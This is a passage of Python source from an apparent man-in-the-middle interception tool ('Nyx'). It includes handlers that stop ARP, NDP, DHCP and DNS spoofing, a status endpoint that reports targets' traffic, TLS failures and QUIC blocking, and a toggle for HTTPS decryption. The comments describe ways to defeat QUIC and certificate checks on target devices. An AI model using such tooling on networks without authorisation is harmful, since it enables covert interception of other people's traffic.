    if _dhcp_spoofer:
        await _dhcp_spoofer.stop()
        _dhcp_spoofer = None

    if _spoofer:
        await _spoofer.stop()
        _spoofer = None

    if _redirect_active:
        # Disable the redirect using the real transparent port —
        # setup_transparent_redirect keys its rules off the port, so passing 0
        # would build nonsensical commands.
        if _engine is not None:
            _exec_admin_redirect(TRANSPARENT_PORT, enable=False)
        _redirect_active = False

    if platform.system().lower() == "windows" and _engine is not None:
        # Tear down WinDivert + IP forwarding so the PC's own traffic is not
        # proxied/slowed while Nyx stays open. Without this, every app on the
        # PC keeps being redirected through the transparent proxy (and IP
        # forwarding stays on) until Nyx is fully closed.
        stop_transparent_transport()
        _engine.transport_ready = False

    # NOTE: the Windows Firewall rule for the proxy port is intentionally NOT
    # removed here. It stays open for the whole backend lifetime so devices
    # configured with a manual proxy (Stealth Mode) can still reach Nyx after
    # interception is stopped; it is only removed at shutdown (shutdown_mitm).

    from core.metrics import registry as _metrics
    _metrics.set("mitm_sessions_active", 0)
    from core.audit import log_audit
    log_audit(action="mitm.stopped", result="success")

    return MITMStopResponse(
        status="ok",
        message="MITM stopped. Traffic restored.",
    )


@router.get("/status")
async def mitm_status():
    global _spoofer, _dns_spoofer, _ndp_spoofer, _dhcp_spoofer
    arp_running = _spoofer is not None and getattr(_spoofer, '_running', False)
    ndp_running = _ndp_spoofer is not None and getattr(_ndp_spoofer, '_running', False)
    dhcp_running = _dhcp_spoofer is not None
    dns_running = _dns_spoofer is not None and getattr(_dns_spoofer, '_running', False)
    # Expose how many requests the proxy has logged so the UI can show
    # whether traffic is actually being intercepted (useful for diagnosis).
    proxy_count = 0
    last_traffic_seen: str | None = None
    if _engine and hasattr(_engine, '_master') and _engine._master:
        try:
            flows = _engine._master.state.flows
            proxy_count = len(flows)
            if flows:
                ts = getattr(flows[-1], 'last_network_timestamp', None) or getattr(flows[-1], 'timestamp_end', None)
                if ts:
                    last_traffic_seen = datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()
        except Exception:
            proxy_count = 0
    local_ip = _get_local_ip()
    transport_ready = bool(_engine and getattr(_engine, "transport_ready", False))
    # "active" = an interception session is currently running (spoofers live).
    # This drives the UI's Start/Stop button — the user must always be able to
    # stop, even if the transport is degraded.
    session_active = bool(_spoofer is not None or _dns_spoofer is not None or _ndp_spoofer is not None or _dhcp_spoofer is not None)
    # Seconds until the auto-mode ARP fallback kicks in (None when DHCP is
    # not waiting on anything: converted, already fell back, or not auto).
    dhcp_fallback_in: float | None = None
    if (
        _dhcp_spoofer is not None
        and _spoofer is None
        and _dhcp_spoofer.lease_requests == 0
        and _dhcp_started_ts is not None
    ):
        elapsed = time.time() - _dhcp_started_ts
        if _dhcp_spoofer.offers_sent == 0:
            dhcp_fallback_in = max(0.0, _DHCP_FALLBACK_GRACE_NO_DISCOVER - elapsed)
        else:
            dhcp_fallback_in = max(0.0, _DHCP_FALLBACK_GRACE_RACE_LOST - elapsed)
    last_arp_sent: str | None = None
    if _spoofer is not None and _spoofer.last_send_ts:
        last_arp_sent = datetime.fromtimestamp(_spoofer.last_send_ts, tz=timezone.utc).isoformat()
    return {
        "active": session_active,
        "transport_ready": transport_ready,
        "arp_spoofing": arp_running,
        "ndp_spoofing": ndp_running,
        "dhcp_spoofing": dhcp_running,
        "dhcp_offers": _dhcp_spoofer.offers_sent if _dhcp_spoofer else 0,
        "dhcp_lease_requests": _dhcp_spoofer.lease_requests if _dhcp_spoofer else 0,
        "dhcp_naks": _dhcp_spoofer.naks_sent if _dhcp_spoofer else 0,
        "dhcp_granted_ips": [lease["ip"] for lease in _dhcp_spoofer.granted_leases] if _dhcp_spoofer else [],
        "dhcp_fallback_in": dhcp_fallback_in,
        "last_arp_sent": last_arp_sent,
        # How many forwarded packets WinDivert has captured. 0 while ARP is
        # active means the target's traffic never reached Nyx (AP isolation /
        # Android self-defence / forwarding off) — nothing can be intercepted.
        "forwarded_packets": windivert_forwarded_count(),
        # When the target's traffic reaches Nyx (forwarded packets) but no flow
        # is ever decrypted, the UI can point at the CA/pinning/QUIC causes
        # instead of claiming "no traffic seen".
        "forwarded_last_seen": (
            datetime.fromtimestamp(windivert_last_forwarded(), tz=timezone.utc).isoformat()
            if windivert_last_forwarded()
            else None
        ),
        # TLS handshakes the TARGET rejected (CA not trusted): the phone tried
        # to reach these hosts but aborted before any flow existed. Count +
        # recent hosts let the UI show "requests" even when no flow decrypts.
        "tls_handshake_failures": _engine.tls_failures()[0] if _engine else 0,
        "tls_failed_hosts": _engine.tls_failures()[1] if _engine else [],
        # CA install page served on the LAN (always reachable — targets
        # install/remove the CA out-of-band via QR or this URL).
        "ca_portal_url": (
            f"http://{local_ip}:{CA_PORTAL_PORT}/"
            if local_ip and local_ip != "127.0.0.1"
            else None
        ),
        # QUIC/HTTP3 blocking: how many of the targets' UDP/443 packets were
        # dropped to force fallback to interceptable TCP/TLS.
        "quic_blocked_packets": quic_dropped_count(),
        # Live per-target activity (SNI + HTTP hosts, most recent first) —
        # works even when the target has NOT installed the Nyx CA.
        "activity": _engine.activity_snapshot()[:60] if _engine else [],
        "dns_spoofing": dns_running,
        "dns_spoof_error": _dns_spoof_error,
        "target_ips": _spoofer.target_ips if _spoofer else (_ndp_spoofer.target_ips if _ndp_spoofer else []),
        "gateway_ip": _spoofer.gateway_ip if _spoofer else (_ndp_spoofer.gateway_ip6 if _ndp_spoofer else None),
        "admin_mode": _is_admin(),
        "proxy_mode": _engine.mode if _engine else None,
        "redirect_active": _redirect_active,
        "captured_flows": proxy_count,
        # Last time the proxy actually handled a flow — lets the UI warn when
        # "active" but nothing has flowed for a while (firewall/CA/QUIC/DoH).
        "last_traffic_seen": last_traffic_seen,
        # Stealth (manual proxy) helper data — lets the UI show exactly how
        # to point a target device at Nyx without ARP spoofing.
        "local_ip": local_ip if local_ip != "127.0.0.1" else None,
        "proxy_host": _engine.host if _engine else None,
        "proxy_port": _engine.port if _engine else None,
        # User-controlled: True = decrypt HTTPS with the Nyx CA (target must
        # trust the CA via DeployBox); False = HTTPS tunnelled untouched, only
        # plain HTTP is intercepted. Toggle via POST /api/mitm/tls.
        "tls_mitm": _engine.tls_mitm if _engine else True,
    }


class TLSSetting(BaseModel):
    active: bool


@router.post("/tls")
async def mitm_set_tls(req: TLSSetting):
    """Enable/disable HTTPS decryption live (no proxy restart needed)."""
    from core.config import settings

    settings.TLS_MITM = bool(req.active)
    if _engine is not None:
        _engine.tls_mitm = bool(req.active)
        logger.info("TLS MITM set to %s by user", _engine.tls_mitm)
    return {"tls_mitm": _engine.tls_mitm if _engine else bool(req.active)}
